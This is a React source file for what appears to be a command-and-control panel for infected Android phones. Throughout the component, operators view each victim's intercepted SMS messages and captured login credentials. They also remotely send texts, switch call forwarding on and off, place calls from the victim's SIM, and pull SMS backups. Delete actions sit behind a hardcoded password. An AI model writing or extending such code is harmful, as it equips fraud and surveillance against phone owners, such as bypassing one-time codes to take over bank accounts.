"use client";
import React, { useState } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

export default function FavouritesPanel({ 
  data, 
  deviceOnlineStatus, 
  deviceSerialMap, 
  favourites, 
  toggleFavourite, 
  showToast,
  openSmsModal 
}) {
  const [expandedDevices, setExpandedDevices] = useState({});
  const [activeTabs, setActiveTabs] = useState({});
  const [formMemory, setFormMemory] = useState({});

  const devices = data.user_data || {};
  const statusData = data.device_status || {};

  const toggleExpand = (id) => {
    setExpandedDevices(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleTab = (devId, tab) => {
    setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
  };

  const copyToClipboard = (text, label = "Item") => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
  };

  const handleCommand = (type, devId) => {
    const baseRef = ref(db, `user_data/${devId}`);

    if (type === "sendsms") {
      const num = formMemory[`fav-smsNum-${devId}`];
      const body = formMemory[`fav-smsText-${devId}`];
      const selectedSim = formMemory[`fav-smsSim-${devId}`] || "0";

      if (!num || !body) return showToast("⚠️ Enter recipient number & message!", "warning");
      if (!confirm(`Send SMS from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "send message",
        targetDeviceId: devId,
        phoneNumber: num,
        messageText: body,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => {
        showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
        setFormMemory(p => ({ ...p, [`fav-smsText-${devId}`]: "" }));
      });
    } 
    else if (type === "fwd_on") {
      const num = formMemory[`fav-fwdNum-${devId}`];
      const selectedSim = formMemory[`fav-fwdSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter forward-to phone number!", "warning");
      if (!confirm(`Activate Call Forward on SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "call forward",
        targetDeviceId: devId,
        phoneNumber: num,
        forwardNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "fwd_off") {
      const selectedSim = formMemory[`fav-fwdSim-${devId}`] || "0";
      if (!confirm(`Deactivate Call Forward on SIM ${Number(selectedSim) + 1}?`)) return;

      update(baseRef, {
        command: "forward off",
        targetDeviceId: devId,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "call") {
      const num = formMemory[`fav-callNum-${devId}`];
      const selectedSim = formMemory[`fav-callSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter target phone number!", "warning");
      if (!confirm(`Make Call from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "make call",
        adminNumber: num,
        phoneNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
    } 
    else if (type === "backup") {
      if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
      update(baseRef, { command: "backup", timestamp: Date.now() })
        .then(() => showToast("💾 Backup initiated", "success"));
    }
  };

  const deleteDeviceData = (devId, type) => {
    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
    if (!confirm(`Delete ${type} for ${devId}?`)) return;

    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
  };

  const clearAll = () => {
    if (!confirm("⚠️ Remove all devices from favourites?")) return;
    favourites.forEach((id) => toggleFavourite(id));
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> Favourite Devices
          </h2>
          <p className="panel-sub">Pinned devices with complete quick controls & monitoring</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> {favourites.length} Pinned
          </span>
          {favourites.length > 0 && (
            <button className="btn-delete-all" onClick={clearAll} style={{ padding: "4px 10px" }}>
              <i className="fas fa-trash"></i> Clear All
            </button>
          )}
        </div>
      </div>

      {favourites.length === 0 ? (
        <div
          className="empty-luxury"
          style={{
            background: "linear-gradient(145deg, #181d2a, #111520)",
            border: "1px solid var(--border-color)",
            borderRadius: "var(--radius)",
            padding: "36px 20px",
          }}
        >
          <i className="fas fa-star empty-icon" style={{ color: "var(--gold)", opacity: 0.6, fontSize: 36 }}></i>
          <h4 style={{ color: "var(--text-primary)", fontSize: 16, marginBottom: 4 }}>No Favourite Devices</h4>
          <p style={{ color: "var(--text-muted)", fontSize: 12 }}>
            Devices panel me kisi bhi device card ke Star (★) icon par click karein.
          </p>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {favourites.map((devId) => {
            const dev = devices[devId] || {};
            const status = statusData[devId] || {};
            const isOnline = Boolean(deviceOnlineStatus?.[devId]);
            const serial = deviceSerialMap?.[devId] || 0;
            const expanded = expandedDevices[devId];
            const curTab = activeTabs[devId];

            const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
            const lastSeen = status.last_seen || dev.last_online || "N/A";

            const smsMap = data.user_sms?.[devId] || {};
            const smsList = Object.values(smsMap).reverse();
            const loginMap = data.login?.[devId] || {};
            const loginList = Object.entries(loginMap).map(([key, val]) => ({
              key,
              ...val,
              _timestamp: val.timestamp || val.date || 0
            })).sort((a, b) => b._timestamp - a._timestamp);

            const sim1Num = dev.numberSim1 || "No SIM 1";
            const sim2Num = dev.numberSim2 || "No SIM 2";

            return (
              <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
                {/* Header */}
                <div className="card-header" onClick={() => toggleExpand(devId)}>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div className="device-name-premium">
                      <button 
                        className="fav-star-btn" 
                        onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                        title="Remove from favourites"
                      >
                        <i className="fas fa-star"></i>
                      </button>
                      <span className="name-text">📱 {devId.slice(0, 14)}...</span>
                      {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                      <button 
                        className="copy-device-id-btn" 
                        onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                      >
                        <i className="fas fa-copy"></i> Copy ID
                      </button>
                      <button 
                        onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                        className="btn-sm"
                        style={{
                          background: "rgba(239, 68, 68, 0.15)",
                          color: "var(--red)",
                          padding: "2px 8px",
                          borderRadius: 6,
                        }}
                      >
                        Remove
                      </button>
                    </div>

                    <div className="device-sub-info">
                      <span><i className="fas fa-microchip"></i> {modelName}</span>
                      <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
                      {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                    </div>
                  </div>

                  <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                    <span className={`status-badge-premium ${isOnline ? "online" : "offline"}`}>
                      <span className="status-dot"></span>
                      {isOnline ? "Online" : "Offline"}
                    </span>
                    <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                      <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
                    </span>
                  </div>
                </div>

                {/* 4-Item Grid Info */}
                <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                  <div className="info-item-premium">
                    <span className="info-label">Device Model</span>
                    <span className="info-value">{modelName}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">SIM 1</span>
                    <span className="info-value">{dev.numberSim1 || "No SIM"}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">SIM 2</span>
                    <span className="info-value">{dev.numberSim2 || "No SIM"}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">Serial</span>
                    <span className="info-value highlight">{serial || "—"}</span>
                  </div>
                </div>

                {/* Toggle Expand */}
                <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                  <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
                </div>

                {/* Expandable Tabs */}
                {expanded && (
                  <div className="expandable-content">
                    <div className="actions-row-premium">
                      {[
                        { id: "sms", label: "SMS", icon: "fas fa-envelope", count: smsList.length },
                        { id: "login", label: "Login", icon: "fas fa-key", count: loginList.length },
                        { id: "call", label: "Call", icon: "fas fa-phone" },
                        { id: "sendsms", label: "Send SMS", icon: "fas fa-paper-plane" },
                        { id: "fwd", label: "Forward", icon: "fas fa-random" },
                        { id: "backup", label: "Backup", icon: "fas fa-database" },
                        { id: "delete", label: "Delete", icon: "fas fa-trash" }
                      ].map(a => (
                        <button 
                          key={a.id} 
                          className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                          onClick={() => handleTab(devId, a.id)}
                        >
                          <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                        </button>
                      ))}
                    </div>

                    {/* SMS Sub-tab */}
                    {curTab === "sms" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <span>Messages ({smsList.length})</span>
                          {openSmsModal && (
                            <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>View Full</button>
                          )}
                        </div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                          {smsList.slice(0, 8).map((m, i) => (
                            <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
                              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
                                <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
                                <span>{m.date || ""}</span>
                              </div>
                              <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Login Sub-tab */}
                    {curTab === "login" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <span>Credentials ({loginList.length})</span>
                          <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                        </div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                          {loginList.length === 0 ? (
                            <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                          ) : (
                            loginList.map((cred, i) => (
                              <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6 }}>
                                {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
                                  <div key={k} style={{ display: "flex", justifyContent: "space-between", fontSize: 11, padding: "2px 0" }}>
                                    <span style={{ color: "var(--text-muted)" }}>{k}:</span>
                                    <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                                  </div>
                                ))}
                              </div>
                            ))
                          )}
                        </div>
                      </div>
                    )}

                    {/* SEND SMS COMMAND */}
                    {curTab === "sendsms" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
                        </div>

                        <div style={{ marginBottom: 10 }}>
                          <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                            Select Outgoing SIM:
                          </label>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                            <button
                              type="button"
                              onClick={() => setFormMemory(p => ({ ...p, [`fav-smsSim-${devId}`]: "0" }))}
                              style={{
                                padding: "8px",
                                borderRadius: 8,
                                border: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                                background: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                                color: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
                                fontSize: 11,
                                fontWeight: 600,
                                cursor: "pointer",
                                textAlign: "center"
                              }}
                            >
                              <i className="fas fa-sim-card"></i> SIM 1 <br/>
                              <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => setFormMemory(p => ({ ...p, [`fav-smsSim-${devId}`]: "1" }))}
                              style={{
                                padding: "8px",
                                borderRadius: 8,
                                border: formMemory[`fav-smsSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                                background: formMemory[`fav-smsSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                                color: formMemory[`fav-smsSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
                                fontSize: 11,
                                fontWeight: 600,
                                cursor: "pointer",
                                textAlign: "center"
                              }}
                            >
                              <i className="fas fa-sim-card"></i> SIM 2 <br/>
                              <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
                            </button>
                          </div>
                        </div>

                        <input 
                          type="text" 
                          placeholder="Recipient Phone Number" 
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                          value={formMemory[`fav-smsNum-${devId}`] || ""}
                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-smsNum-${devId}`]: e.target.value }))}
                        />
                        <textarea 
                          placeholder="Type Message Content..." 
                          rows="3"
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                          value={formMemory[`fav-smsText-${devId}`] || ""}
                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-smsText-${devId}`]: e.target.value }))}
                        />
                        <button 
                          className="btn-luxury btn-blue" 
                          style={{ width: "100%", justifyContent: "center", padding: "10px" }} 
                          onClick={() => handleCommand("sendsms", devId)}
                        >
                          <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(formMemory[`fav-smsSim-${devId}`] || "0") + 1)}
                        </button>
                      </div>
                    )}

                    {/* CALL FORWARD COMMAND */}
                    {curTab === "fwd" && (
                      <div className="section-premium">
                        <div className="section-title">
                          <i className="fas fa-random" style={{ marginRight: 6 }}></i> Call Forward Controls
                        </div>

                        <div style={{ marginBottom: 10 }}>
                          <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                            Select Target SIM for Forwarding:
                          </label>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                            <button
                              type="button"
                              onClick={() => setFormMemory(p => ({ ...p, [`fav-fwdSim-${devId}`]: "0" }))}
                              style={{
                                padding: "8px",
                                borderRadius: 8,
                                border: (formMemory[`fav-fwdSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                                background: (formMemory[`fav-fwdSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                                color: (formMemory[`fav-fwdSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
                                fontSize: 11,
                                fontWeight: 600,
                                cursor: "pointer",
                                textAlign: "center"
                              }}
                            >
                              <i className="fas fa-sim-card"></i> SIM 1 <br/>
                              <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => setFormMemory(p => ({ ...p, [`fav-fwdSim-${devId}`]: "1" }))}
                              style={{
                                padding: "8px",
                                borderRadius: 8,
                                border: formMemory[`fav-fwdSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                                background: formMemory[`fav-fwdSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                                color: formMemory[`fav-fwdSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
                                fontSize: 11,
                                fontWeight: 600,
                                cursor: "pointer",
                                textAlign: "center"
                              }}
                            >
                              <i className="fas fa-sim-card"></i> SIM 2 <br/>
                              <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
                            </button>
                          </div>
                        </div>

                        <input 
                          type="text" 
                          placeholder="Forward To Phone Number" 
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                          value={formMemory[`fav-fwdNum-${devId}`] || ""}
                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-fwdNum-${devId}`]: e.target.value }))}
                        />

                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button 
                            className="btn-luxury" 
                            style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
                            onClick={() => handleCommand("fwd_on", devId)}
                          >
                            <i className="fas fa-play"></i> Turn ON Forward
                          </button>
                          <button 
                            className="btn-luxury btn-red" 
                            style={{ justifyContent: "center", padding: "10px" }} 
                            onClick={() => handleCommand("fwd_off", devId)}
                          >
                            <i className="fas fa-stop"></i> Turn OFF Forward
                          </button>
                        </div>
                      </div>
                    )}

                    {/* Call Sub-tab */}
                    {curTab === "call" && (
                      <div className="section-premium">
                        <div className="section-title">Make Call Command</div>

                        <div style={{ marginBottom: 10, display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button
                            type="button"
                            onClick={() => setFormMemory(p => ({ ...p, [`fav-callSim-${devId}`]: "0" }))}
                            style={{
                              padding: "6px",
                              borderRadius: 6,
                              border: (formMemory[`fav-callSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                              background: (formMemory[`fav-callSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                              color: (formMemory[`fav-callSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
                              fontSize: 11,
                              fontWeight: 600,
                              cursor: "pointer"
                            }}
                          >
                            SIM 1
                          </button>
                          <button
                            type="button"
                            onClick={() => setFormMemory(p => ({ ...p, [`fav-callSim-${devId}`]: "1" }))}
                            style={{
                              padding: "6px",
                              borderRadius: 6,
                              border: formMemory[`fav-callSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                              background: formMemory[`fav-callSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                              color: formMemory[`fav-callSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
                              fontSize: 11,
                              fontWeight: 600,
                              cursor: "pointer"
                            }}
                          >
                            SIM 2
                          </button>
                        </div>

                        <input 
                          type="text" 
                          placeholder="Enter target phone number" 
                          className="search-input" 
                          style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                          value={formMemory[`fav-callNum-${devId}`] || ""}
                          onChange={(e) => setFormMemory(p => ({ ...p, [`fav-callNum-${devId}`]: e.target.value }))}
                        />
                        <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                          <i className="fas fa-phone"></i> Make Call from SIM {(Number(formMemory[`fav-callSim-${devId}`] || "0") + 1)}
                        </button>
                      </div>
                    )}

                    {/* Backup Sub-tab */}
                    {curTab === "backup" && (
                      <div className="section-premium">
                        <div className="section-title">Device Backup</div>
                        <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
                          <i className="fas fa-database"></i> Trigger Full Backup
                        </button>
                      </div>
                    )}

                    {/* Delete Sub-tab */}
                    {curTab === "delete" && (
                      <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                        <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
                            Delete SMS
                          </button>
                          <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                            Delete Creds
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
